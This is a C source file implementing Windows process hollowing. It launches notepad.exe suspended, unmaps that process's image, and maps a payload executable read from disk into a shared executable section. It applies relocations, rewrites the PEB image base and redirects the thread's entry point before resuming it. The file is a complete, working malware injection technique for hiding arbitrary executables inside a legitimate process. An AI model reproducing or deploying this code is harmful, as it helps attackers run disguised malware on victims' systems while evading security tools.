#include <windows.h>
#include <stdio.h>
#include <intrin.h>
#include <processthreadsapi.h>
#include <winternl.h>



typedef NTSTATUS(NTAPI* pfnNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE           ProcessHandle,            
    PROCESSINFOCLASS ProcessInformationClass,  
    PVOID            ProcessInformation,      
    ULONG            ProcessInformationLength, 
    PULONG           ReturnLength        
);
typedef NTSTATUS(NTAPI* pfnNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN ULONG InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

LPVOID getpe(DWORD *payload_size){
    HANDLE hFile = CreateFileW(L"C:\\Users\\payload.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileW failed: %lu\n", GetLastError());
        return NULL;
    }
    *payload_size = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)malloc(*payload_size);
    DWORD bytesRead =0;
    ReadFile(hFile, buffer, *payload_size, &bytesRead, NULL);
    CloseHandle(hFile);
    return buffer;
}


void new_malloc(PVOID* remoteBase, PVOID* localBase,PROCESS_BASIC_INFORMATION* pbi, DWORD payload_size_of_image, HANDLE hProcess){
    SIZE_T viewSize = 0;
    LARGE_INTEGER sectionSize = {0};
    HANDLE hSection = NULL;
    PVOID target_image_base = 0;
    sectionSize.QuadPart = payload_size_of_image;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtCreateSection NtCreateSection_ldr = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection_ldr = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    pNtQueryInformationProcess NtQueryInformationProcess_ldr = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    NtQueryInformationProcess_ldr(hProcess,0,pbi,sizeof(PROCESS_BASIC_INFORMATION),NULL);
    ReadProcessMemory(hProcess,(PBYTE)pbi->PebBaseAddress + 0x10, &target_image_base,sizeof(target_image_base), NULL);
    NtUnmapViewOfSection_ldr(hProcess, target_image_base);
    NtCreateSection_ldr( &hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    pfnNtMapViewOfSection NtMapViewOfSection_ldr = (pfnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtMapViewOfSection_ldr(hSection, GetCurrentProcess(), localBase, 0, 0, NULL,&viewSize, 2, 0, PAGE_READWRITE);
    viewSize = 0;
    NtMapViewOfSection_ldr(hSection, hProcess, remoteBase, 0, 0, NULL,&viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
    }

void write_remote_memory(PVOID remoteBase, PVOID localBase, ULONGLONG payload_image_base, PIMAGE_NT_HEADERS nt_header, LPVOID payload_buffer){
    ULONGLONG delta = (ULONGLONG)remoteBase - payload_image_base;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir  = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        DWORD reloc_rva = relocDir.VirtualAddress;
        DWORD reloc_size = relocDir.Size;
        LPVOID reloc_base = (BYTE*)payload_buffer + reloc_rva;
        BYTE* reloc_end = (BYTE*)reloc_base + reloc_size;
        while (reloc_base < reloc_end) {
            IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc_base;
            if (block->SizeOfBlock == 0){
                break;
            }
            WORD* entries = (WORD*)((BYTE*)reloc_base + sizeof(IMAGE_BASE_RELOCATION));
            DWORD entry_count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);    
            for (DWORD i = 0; i < entry_count; i++) {
                WORD type   = entries[i] >> 12;        // 상위 4비트
                WORD offset = entries[i] & 0xFFF;      // 하위 12비트

                if (type == IMAGE_REL_BASED_DIR64) {   // 10 (0xA) — 64비트
                    ULONGLONG* patchAddr = (ULONGLONG*)((BYTE*)payload_buffer + block->VirtualAddress + offset);
                    *patchAddr += delta;
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {  // 3 — 32비트
                    DWORD* patchAddr = (DWORD*)((BYTE*)payload_buffer + block->VirtualAddress + offset);
                    *patchAddr += (DWORD)delta;
                }
        }
            reloc_base = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc_base + block->SizeOfBlock);

    }
}
    memcpy(localBase, payload_buffer, nt_header->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header);
    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)localBase + section[i].VirtualAddress, (BYTE*)payload_buffer + section[i].PointerToRawData, section[i].SizeOfRawData);
    }
}


int main() {
    PROCESS_INFORMATION pi ={0};
    STARTUPINFOA si = { sizeof(si)  } ;
    BOOL notepad_handle = CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!notepad_handle) {
        printf("Failed to create process. Error code: %lu\n", GetLastError());
        return 1;
    }
    PVOID localBase = NULL;
    PVOID remoteBase = NULL;
    PROCESS_BASIC_INFORMATION pbi ={0};
    DWORD payload_size =0;
    LPVOID payload_buffer = getpe(&payload_size);
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)payload_buffer;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS signature.\n");
        return 1;
    }
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((BYTE*)payload_buffer + dos_header->e_lfanew);
    if (nt_header->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT signature.\n");
        return 1;
    }
    DWORD payload_size_of_image = nt_header->OptionalHeader.SizeOfImage;
    ULONGLONG  payload_image_base = nt_header->OptionalHeader.ImageBase;
    new_malloc(&remoteBase, &localBase, &pbi,payload_size_of_image, pi.hProcess);
    write_remote_memory(remoteBase, localBase, payload_image_base, nt_header, payload_buffer);
    WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, &remoteBase, sizeof(PVOID), NULL);
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)((BYTE*)remoteBase + nt_header->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
